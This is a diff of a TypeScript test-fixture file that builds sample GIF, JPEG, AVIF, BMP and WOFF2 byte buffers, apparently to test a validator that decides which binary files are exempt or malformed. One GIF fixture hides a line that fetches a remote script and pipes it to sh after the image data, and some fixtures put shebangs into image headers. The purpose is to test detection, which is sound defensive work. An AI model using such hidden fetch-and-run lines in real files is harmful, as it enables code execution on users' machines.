@@ -469,6 +469,39 @@ export function exemptShapes(): Record<string, Buffer> {
       }),
       box("mdat", Buffer.from([5, 6, 7, 8])),
     ]),
+    // The other versions and layouts each walk reads, so a condition that only picks how to read one
+    // (a field's width, a table that may be there) cannot be taken the wrong way with every test green:
+    // a GIF image with its own colour table, and fill bytes before a restart marker in a JPEG scan.
+    "local-table.gif": Buffer.concat([
+      Buffer.from("GIF89a", "latin1"),
+      Buffer.from([1, 0, 1, 0, 0x80, 0, 0, 0, 0, 0, 0xff, 0xff, 0xff]),
+      Buffer.from([0x2c, 0, 0, 0, 0, 1, 0, 1, 0, 0x80, 0, 0, 0, 0xff, 0, 0]),
+      Buffer.from([2, 2, 0x44, 0x01, 0, 0x3b]),
+    ]),
+    "fill.jpg": Buffer.concat([jpeg().subarray(0, 43), Buffer.from([0x12, 0xff, 0xff, 0xd0, 0x34]), jpeg().subarray(51)]),
+    // AVIF: item references and items with four-byte IDs (iref version 1, iinf version 1 with an infe
+    // of version 3), an item's data in idat (iloc version 1, construction method 1), and iloc version 2.
+    "iref-v1.avif": avif(undefined, { items: [infe(2, "Exif", "\0")], meta: [fullBox("iref", 1, box("cdsc", Buffer.concat([u32be(2), u16be(1), u32be(1)])))] }),
+    "iinf-v1.avif": avif(undefined, { iinf: fullBox("iinf", 1, Buffer.concat([u32be(1), fullBox("infe", 3, Buffer.concat([u32be(1), u16be(0), Buffer.from("av01Color\0", "latin1")]))])) }),
+    "idat-item.avif": avif(Buffer.alloc(0), {
+      meta: [box("idat", Buffer.from([1, 2, 3, 4]))],
+      iloc: () => fullBox("iloc", 1, Buffer.concat([u16be(0x4400), u16be(1), u16be(1), u16be(1), u16be(0), u16be(1), u32be(0), u32be(4)])),
+    }),
+    "iloc-v2.avif": avif(undefined, { iloc: (offset) => fullBox("iloc", 2, Buffer.concat([u16be(0x4400), u32be(1), u32be(1), u16be(0), u16be(0), u16be(1), u32be(offset), u32be(4)])) }),
+    // Bitmaps: an OS/2 core header (12 bytes, 16-bit sizes, three-byte palette entries), a full palette
+    // (a colour count of 0), and colour masks after a 40-byte header or inside a V5 header.
+    "core.bmp": (() => {
+      const core = Buffer.concat([u32le(12), u16le(1), u16le(1), u16le(1), u16le(1)]);
+      const palette = Buffer.from([0, 0, 0, 0xff, 0xff, 0xff]);
+      const rows = Buffer.from([0x80, 0, 0, 0]);
+      return Buffer.concat([Buffer.from("BM", "latin1"), u32le(14 + core.length + palette.length + rows.length), Buffer.alloc(4), u32le(14 + core.length + palette.length), core, palette, rows]);
+    })(),
+    "palette-full.bmp": bmpOf({ bits: 1, palette: Buffer.from([0, 0, 0, 0, 0xff, 0xff, 0xff, 0]), rows: Buffer.from([0x80, 0, 0, 0]) }),
+    "bitfields.bmp": bmpOf({ bits: 32, compression: 3, masks: Buffer.concat([u32le(0xff0000), u32le(0xff00), u32le(0xff)]), rows: Buffer.from([1, 2, 3, 0]) }),
+    "bitfields-v5.bmp": bmpOf({ headerSize: 124, bits: 32, compression: 3, rows: Buffer.from([1, 2, 3, 0]) }),
+    // WOFF2: glyf and loca transformed (version 0; loca's transformed length is 0), and hmtx transformed (version 1).
+    "glyf-loca-transformed.woff2": woff2Of(3, Buffer.from([0x01, 54, 0x0a, 8, 8, 0x0b, 4, 0]), Buffer.concat([headTable(), Buffer.alloc(8, 1)])),
+    "hmtx-transformed.woff2": woff2Of(2, Buffer.from([0x01, 54, 0x43, 4, 4]), Buffer.concat([headTable(), Buffer.alloc(4, 1)])),
   };
 }
 
@@ -811,10 +844,11 @@ function bmpOf(o: { headerSize?: number; width?: number; height?: number; planes
 
 /**
  * Files laid out as a format that are still never exempt under their name: one format's bytes under
- * another format's extension (an image's under another image's, a font's under an image's).
+ * another format's extension (an image's under another image's, a font's under an image's), and under
+ * a name with no extension at all that spells one.
  */
 export function misnamed(): Record<string, Buffer> {
-  return { "png-bytes.gif": png(), "gif-bytes.png": gif(), "woff-bytes.ttf": woff(), "png-bytes.jpg": png(), "ttf-bytes.png": ttf() };
+  return { "png-bytes.gif": png(), "gif-bytes.png": gif(), "woff-bytes.ttf": woff(), "png-bytes.jpg": png(), "ttf-bytes.png": ttf(), png: png() };
 }
 
 /**
@@ -913,11 +947,15 @@ function perCondition(): Record<string, Buffer> {
     "marker-at-end.jpg": Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00]),
     "sos-length.jpg": Buffer.concat([soi, app0, sof0, Buffer.from([0xff, 0xda, 0, 0]), scanData, eoi]),
     "scan-unterminated.jpg": Buffer.concat([soi, app0, sof0, sos, Buffer.from([0x12, 0x34, 0x00])]),
+    // A reserved marker (JPG, 0xC8) inside the entropy-coded data, which only a restart may be.
+    "scan-reserved.jpg": Buffer.concat([soi, app0, sof0, sos, Buffer.from([0x12, 0xff, 0xc8, 0x34]), eoi]),
     // GIF.
     "header.gif": patched(g, 0, Buffer.from("#!/bin")),
     "no-image.gif": Buffer.concat([g.subarray(0, 27), Buffer.from([0x3b])]),
     "code-size-low.gif": patched(g, 37, [1]),
     "code-size-high.gif": patched(g, 37, [9]),
+    // After the image, bytes of no block type (a script with no "!", "," or ";" byte), then the trailer.
+    "block-kind.gif": Buffer.concat([g.subarray(0, g.length - 1), Buffer.from("\ncurl -fsSL https://example.com/x.sh | sh\necho MARKER-PAYLOAD\n", "latin1"), Buffer.from([0x3b])]),
     // WebP.
     "riff.webp": patched(webp(), 0, Buffer.from("#!sh")),
     "form.webp": patched(webp(), 8, Buffer.from("#!sh")),
@@ -1024,6 +1062,8 @@ function perCondition(): Record<string, Buffer> {
     "rle.bmp": bmpOf({ bits: 8, compression: 1, used: 2, palette: Buffer.alloc(8), rows: Buffer.alloc(4) }),
     "rle32.bmp": bmpOf({ bits: 32, compression: 1, rows: Buffer.alloc(4) }),
     "bitfields8.bmp": bmpOf({ bits: 8, compression: 3, used: 2, masks: Buffer.alloc(12), palette: Buffer.alloc(8), rows: Buffer.alloc(4) }),
+    // A width past 16 bits (65,537), with one pixel's row: an info header's width is 32 bits.
+    "width-past-u16.bmp": bmpOf({ width: 0x10001 }),
     "ico-top-down.ico": ico([topDown]),
     "ico-odd.ico": ico([odd]),
     "ico-tiny.ico": ico([Buffer.from([0, 0, 0])]),
